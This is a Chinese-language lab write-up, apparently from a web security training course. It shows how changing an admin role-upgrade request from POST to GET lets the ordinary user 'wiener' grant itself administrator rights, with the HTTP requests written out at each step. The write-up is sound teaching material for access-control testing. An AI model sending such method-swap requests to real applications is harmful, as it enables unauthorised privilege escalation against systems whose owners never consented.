# 实验：基于方法的访问控制可被绕过

本实验部分基于请求的 HTTP 方法实现访问控制。你可以通过使用凭据 `administrator:admin` 登录来熟悉管理员面板。

为了解决本实验，请使用凭据 `wiener:peter` 登录，并利用有缺陷的访问控制将自己提升为管理员。

## 步骤

探测
- 使用提供的管理员凭据登录，在管理员面板 `/admin` 使用用户权限管理功能
    ```http
    POST /admin-roles HTTP/2

    username=carlos&action=upgrade
    ```

- 尝试转换用户管理端点的方法为 GET
    ```http
    GET /admin-roles?username=carlos&action=downgrade HTTP/2
    ```
    - 可成功执行
    - 额外测试有效方法
        - `HEAD`
        - `X` 不存在的方法

使用 wiener 用户凭据登录
- 尝试访问管理员面板
    ```http
    GET /admin HTTP/2
    ```
    - 服务器响应 401
        `Admin interface only available if logged in as an administrator`

- 尝试使用转换后的方法访问角色控制功能
    ```http
    GET /admin-roles?username=wiener&action=upgrade HTTP/2
    ```
    - 成功
